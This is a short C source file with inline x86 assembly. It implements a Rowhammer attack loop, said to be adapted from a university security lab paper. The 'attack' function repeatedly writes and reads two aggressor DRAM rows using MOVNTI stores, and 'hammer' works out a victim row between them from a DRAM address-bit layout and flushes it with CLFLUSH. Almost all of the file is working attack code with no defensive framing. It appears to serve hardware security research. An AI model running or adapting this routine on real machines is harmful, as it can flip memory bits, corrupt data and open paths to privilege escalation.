// original code received from Loïc France
// the  attack loop modified according to http://seclab.cs.sunysb.edu/seclab/pubs/host16.pdf

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#define BUFFER_SIZE (1 << 18)
#define BUFFER_SIZE_MASK (BUFFER_SIZE - 1)
#define RH_THRESHOLD (10000)
#define LF "\n"

#define FLUSH(addr) asm volatile("CLFLUSH (%[a])"::[a] "r" (addr):)


void attack(const uint32_t nb_loops, const uintptr_t addr1, const uintptr_t addr2)
{
    asm volatile(
        "MOV %[nb_loops], %%ecx  \n"
        "JMP hammer_loop_asm     \n"
        "hammer_loop_asm:        \n"
        "  MOVNTI %%eax, (%[addr1]) \n"
        "  MOVNTI %%eax, (%[addr2]) \n"
        "  MOV (%[addr1]), %%edx \n"
        "  MOV (%[addr2]), %%edx \n"
	      "  LOOP hammer_loop_asm  \n"
        :: [nb_loops] "r" (nb_loops),
	   [addr1] "r" (addr1),
           [addr2] "r" (addr2)
        : "%eax", "%ecx", "%edx", "memory"
        );

}

typedef union {
  uintptr_t addr;
  struct {
    uintptr_t buffer: 6;
    uintptr_t column: 7;
    uintptr_t bank_group: 2;
    uintptr_t bank: 2;
    uintptr_t row: 15;
};
} addr_t;

void hammer() {
  uint32_t buffer[(5<<(6+7+2+2))/sizeof(uint32_t)]; // 5 rows
  addr_t agg1 = {.addr = (uintptr_t) &(buffer[0])};
  addr_t vict = {.addr = agg1.addr};
  addr_t agg2 = {.addr = agg1.addr};
  vict.row += 1;
  agg2.row += 2;
  // vict.row += 2;
  memset(buffer, 0xFF, sizeof(buffer));
  // printf("%lld\n", (5<<(6+7+2+2))/sizeof(uint32_t)); gives 163840
  /* printf("agg1:%xh[%d|%d|%xh|%xh]"LF, agg1.addr, agg1.bank_group, agg1.bank, agg1.row, agg1.column);
  printf("agg2:%xh[%d|%d|%xh|%xh]"LF, agg2.addr, agg2.bank_group, agg2.bank, agg2.row, agg2.column);
  printf("vict:%xh[%d|%d|%xh|%xh] = %08Xh", vict.addr, vict.bank_group, vict.bank, vict.row, 
                                            vict.column, *((int*)vict.addr)); */

  FLUSH(vict.addr);
  attack(RH_THRESHOLD, agg1.addr, agg2.addr);
  FLUSH(vict.addr);
  /* printf("vict:%xh[%d|%d|%xh|%xh] = %08Xh", vict.addr, vict.bank_group, vict.bank, vict.row,
                                            vict.column, *((int*)vict.addr)); */
}

int main() {

  asm volatile ("start_program:");
    hammer();
  asm volatile ("end_program:\nnop");
  return 0;
}